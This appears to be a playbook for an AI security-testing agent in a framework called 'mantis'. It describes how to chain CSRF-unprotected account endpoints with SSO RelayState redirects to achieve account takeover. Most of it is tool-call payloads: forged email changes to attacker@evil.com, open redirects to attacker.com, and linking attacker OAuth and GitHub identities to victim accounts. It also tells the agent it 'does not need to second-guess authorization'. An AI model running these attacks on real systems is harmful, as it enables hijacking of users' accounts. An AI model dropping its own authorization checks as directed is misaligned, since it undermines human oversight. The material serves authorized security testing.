# C8_csrf_to_sso

Chain a CSRF vulnerability on an authenticated endpoint with an SSO redirect to escalate to full account takeover. The attack exploits the intersection of CSRF-unprotected state-changing actions and an SSO provider's redirect flow: a victim who clicks an attacker-crafted link simultaneously triggers the CSRF action and gets redirected into the attacker's SSO session, merging accounts or changing the victim's linked identity. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface has both SSO login (`/auth/saml`, `/auth/oauth`, `/login/sso`) and account-linking or email-change endpoints.
- CSRF tokens are absent, weak, or not validated on POST endpoints (confirmed by prior wave or C7).
- Traffic shows `RelayState`, `SAMLRequest`, `state`, or `nonce` SSO parameters.
- Bug-class hints include `csrf`, `sso`, `account-linking`, `saml-relay`, or `account-takeover`.

---

## Workflow

1. **Load assignment and map SSO entry points.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   From traffic summary, locate SSO initiation endpoints and account-management endpoints (email-change, password-reset, account-linking, profile-update).

2. **Identify CSRF-unprotected endpoints.**
   For each sensitive POST/PUT endpoint, submit the request without the CSRF token or with an empty/garbage token:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/account/email", body: { email: "attacker@evil.com" }, headers: { "X-CSRF-Token": "" }, auth_profile: "victim", egress_profile })
   ```
   If the server responds 200/204 rather than 403, record the endpoint as CSRF-vulnerable.

3. **Map SSO RelayState handling.**
   Trigger the SSO flow and capture the `RelayState` (SAML) or `state` (OAuth) parameter. Test whether RelayState is validated or used as an open redirect post-authentication:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/auth/saml?RelayState=https://attacker.com", egress_profile })
   ```
   If the SSO callback redirects to the RelayState value without validation, it enables open-redirect chaining.

4. **Chain: CSRF-trigger + SSO redirect.**
   Craft a payload that simultaneously:
   a. Submits the CSRF-unprotected action (e.g. link attacker's SSO identity to victim account).
   b. Redirects the victim into the attacker's SSO authorization flow.
   Test the combined chain using the attacker session to simulate what a victim clicking a malicious link would experience:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/account/link-sso", body: { provider: "google", oauth_token: "ATTACKER_OAUTH_TOKEN" }, auth_profile: "victim", egress_profile })
   ```
   If victim account now accepts attacker's OAuth credentials as a valid login, the chain succeeds.

5. **SAML-specific: RelayState injection.**
   For SAML SSO, inject a crafted `RelayState` that, after authentication, redirects to a CSRF-triggering page:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/auth/saml/acs", body: { SAMLResponse: "<BASE64_RESPONSE>", RelayState: "https://app.example.com/api/account/link?token=attacker_token" }, egress_profile })
   ```
   Confirm the victim's session executes the account-link action after SSO completion.

6. **Account-merge / identity-confusion test.**
   If the application supports login-with-multiple-providers, test whether linking a provider to an existing account can be done without re-authentication:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/sso/connect", body: { provider: "github", code: "ATTACKER_GITHUB_CODE" }, auth_profile: "victim", egress_profile })
   ```
   If the victim's account now has the attacker's GitHub identity linked, confirm the attacker can log into the victim's account via GitHub OAuth.

7. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/api/account/link-sso", method: "POST", bug_class: "csrf_sso_chain", auth_profile: "victim", status: "promising"|"tested", evidence_summary: "POST without CSRF token linked attacker SSO identity to victim account" }] })
   ```

8. **Record chain attempt.**
   ```
   mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "csrf-sso-ato", step: "csrf_action_confirmed", evidence: "POST /api/account/link-sso accepted without CSRF token; attacker GitHub linked to victim", outcome: "partial_evidence" })
   ```

9. **Record finding.**
   Call `mantis_list_findings` first:
   ```
   mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "victim", title: "CSRF on SSO account-link endpoint — account takeover via identity injection", severity: "critical", cwe: "CWE-352", endpoint: "/api/account/link-sso", description: "...", proof_of_concept: "<full chain: crafted POST + SSO redirect + login as victim>", response_evidence: "...", impact: "Attacker links own SSO identity to victim account; logs in as victim without credentials", validated: true })
   ```

10. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["CSRF-SSO chain confirmed ATO; see C12 for broader takeover surface", "RelayState open-redirect feeds C11"] })
    ```

11. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "sso_identity_login", notes: "After linking, verify attacker can log in to victim account using attacker SSO credentials" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full CSRF request (POST without token or with forged token) and 200/204 response.
- SSO link confirmation: victim account profile showing attacker's linked provider identity.
- Proof attacker can authenticate as victim: successful login using attacker's SSO identity on victim's account.
- Timeline of steps: CSRF trigger → SSO redirect → identity link → attacker login.
- Both session cookies / auth tokens for before (victim owns account) and after (attacker accesses victim account) states.

---

## Stop conditions

- CSRF token validated on all account-mutation endpoints (403 on empty/garbage token).
- SSO RelayState validated against a server-side allowlist; open-redirect attempt returns 400.
- Account-linking requires re-authentication (password confirmation or second factor).
- Two WAF blocks on CSRF mutation attempts — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **SameSite cookie blocking.** Modern browsers enforce `SameSite=Lax` by default, which blocks cross-site POST CSRF. Only report CSRF if the attack is actually deliverable — verify cookie SameSite attribute and whether a GET-based CSRF variant works.
- **SSO RelayState as decoration.** Some implementations include RelayState but ignore it post-callback. Confirm the redirect actually occurs before claiming open-redirect.
- **Same-account link test.** Linking the attacker's SSO identity to the attacker's own account is not a vulnerability. The test requires cross-account linking: attacker's SSO → victim's account.
- **SAML replay.** SAML assertions have replay protection via `InResponseTo` and assertion IDs. Do not attempt SAML replay as a CSRF vector unless you control the assertion issuance.

---

## Next chain

Feeds into **C12_account_takeover** (full ATO after SSO identity injection), **C11_open_redirect_chain** (RelayState open-redirect leg), and **C7_oauth_state_pkce** (if the SSO uses OAuth with missing state/PKCE).
